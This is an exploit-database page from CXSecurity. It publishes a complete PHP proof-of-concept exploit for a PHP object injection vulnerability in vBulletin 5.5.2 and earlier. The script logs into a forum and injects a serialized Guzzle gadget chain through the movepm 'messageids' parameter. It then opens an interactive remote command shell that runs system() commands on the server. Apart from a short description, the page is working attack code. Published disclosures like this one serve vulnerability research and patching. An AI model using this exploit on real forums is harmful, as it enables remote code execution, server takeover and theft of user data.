---
title: vBulletin 5.5.2 PHP Object Injection
url: https://cxsecurity.com/issue/WLB-2022110051
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-30
fetch_date: 2025-10-04T00:03:33.679000
---

# vBulletin 5.5.2 PHP Object Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **vBulletin 5.5.2 PHP Object Injection** **2022.11.29**  Credit:  **[EgiX](https://cxsecurity.com/author/EgiX/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

<?php
/\*
--------------------------------------------------------------
vBulletin <= 5.5.2 (movepm) PHP Object Injection Vulnerability
--------------------------------------------------------------
author..............: Egidio Romano aka EgiX
mail................: n0b0d13s[at]gmail[dot]com
software link.......: https://www.vbulletin.com
+-------------------------------------------------------------------------+
| This proof of concept code was written for educational purpose only. |
| Use it at your own risk. Author will be not responsible for any damage. |
+-------------------------------------------------------------------------+
[-] Vulnerability Description:
User input passed through the "messageids" request parameter to /ajax/api/vb4\_private/movepm is
not properly sanitized before being used in a call to the unserialize() PHP function. This can
be exploited by malicious users to inject arbitrary PHP objects into the application scope,
allowing them to carry out a variety of attacks, such as executing arbitrary PHP code.
[-] Technical writeup:
http://karmainsecurity.com/exploiting-an-nday-vbulletin-php-object-injection
\*/
set\_time\_limit(0);
error\_reporting(E\_ERROR);
if (!extension\_loaded("curl")) die("[+] cURL extension required!\n");
print "+------------------------------------------------------------------+";
print "\n| vBulletin <= 5.5.2 (movepm) PHP Object Injection Exploit by EgiX |";
print "\n+------------------------------------------------------------------+\n";
if ($argc != 4)
{
print "\nUsage......: php $argv[0] <URL> <Username> <Password>\n";
print "\nExample....: php $argv[0] http://localhost/vb/ user passwd";
print "\nExample....: php $argv[0] https://vbulletin.com/ evil hacker\n\n";
die();
}
class googlelogin\_vendor\_autoload {} // fake class to include the autoloader
class GuzzleHttp\_HandlerStack
{
private $handler, $stack;
function \_\_construct($cmd)
{
$this->stack = [["system"]]; // the callback we want to execute
$this->handler = $cmd; // argument for the callback
}
}
class GuzzleHttp\_Psr7\_FnStream
{
function \_\_construct($callback)
{
$this->\_fn\_close = $callback;
}
}
function make\_popchain($cmd)
{
$pop = new GuzzleHttp\_HandlerStack($cmd);
$pop = new GuzzleHttp\_Psr7\_FnStream([$pop, 'resolve']);
$chain = serialize([new googlelogin\_vendor\_autoload, $pop]);
$chain = str\_replace(['s:', chr(0)], ['S:', '\00'], $chain);
$chain = str\_replace('GuzzleHttp\_HandlerStack', 'GuzzleHttp\HandlerStack', $chain);
$chain = str\_replace('GuzzleHttp\_Psr7\_FnStream', 'GuzzleHttp\Psr7\FnStream', $chain);
$chain = str\_replace('0GuzzleHttp\HandlerStack', '0GuzzleHttp\5CHandlerStack', $chain);
return $chain;
}
list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, false);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_HEADER, true);
print "[+] Logging in with username '{$user}' and password '{$pass}'\n";
curl\_setopt($ch, CURLOPT\_URL, $url);
if (!preg\_match("/Cookie: .\*sessionhash=[^;]+/", curl\_exec($ch), $sid)) die("[+] Session ID not found!\n");
curl\_setopt($ch, CURLOPT\_URL, "{$url}?routestring=auth/login");
curl\_setopt($ch, CURLOPT\_HTTPHEADER, $sid);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, "username={$user}&password={$pass}");
if (!preg\_match("/Cookie: .\*sessionhash=[^;]+/", curl\_exec($ch), $sid)) die("[+] Login failed!\n");
print "[+] Logged-in! Retrieving security token\n";
curl\_setopt($ch, CURLOPT\_URL, $url);
curl\_setopt($ch, CURLOPT\_POST, false);
curl\_setopt($ch, CURLOPT\_HEADER, false);
curl\_setopt($ch, CURLOPT\_HTTPHEADER, $sid);
if (!preg\_match('/token": "([^"]+)"/', curl\_exec($ch), $token)) die("[+] Security token not found!\n");
$params = ["routestring" => "ajax/api/vb4\_private/movepm",
"securitytoken" => $token[1],
"folderid" => 1];
print "[+] Launching shell\n";
while(1)
{
print "\nvb-shell# ";
if (($cmd = trim(fgets(STDIN))) == "exit") break;
$params["messageids"] = make\_popchain($cmd);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, http\_build\_query($params));
preg\_match('/(.\*){"response":/s', curl\_exec($ch), $m) ? print $m[1] : die("\n[+] Exploit failed!\n");
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110051)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top